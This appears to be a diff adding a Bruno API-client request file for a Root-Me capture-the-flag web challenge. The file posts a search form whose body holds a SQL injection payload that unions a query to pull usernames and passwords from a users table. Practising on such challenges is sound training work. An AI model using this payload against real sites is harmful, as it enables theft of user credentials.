@@ -1,0 +1,32 @@
+meta {
+  name: union
+  type: http
+  seq: 1
+}
+
+post {
+  url: {{url}}{{string_path}}?action=recherche
+  body: formUrlEncoded
+  auth: none
+}
+
+params:query {
+  action: recherche
+}
+
+headers {
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+  Cache-Control: max-age=0
+  Connection: keep-alive
+  Content-Type: application/x-www-form-urlencoded
+  DNT: 1
+  Origin: http://challenge01.root-me.org
+  Referer: http://challenge01.root-me.org/web-serveur/ch19/?action=recherche
+  Upgrade-Insecure-Requests: 1
+  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+}
+
+body:form-urlencoded {
+  recherche: ' union select username,password from users;
+}
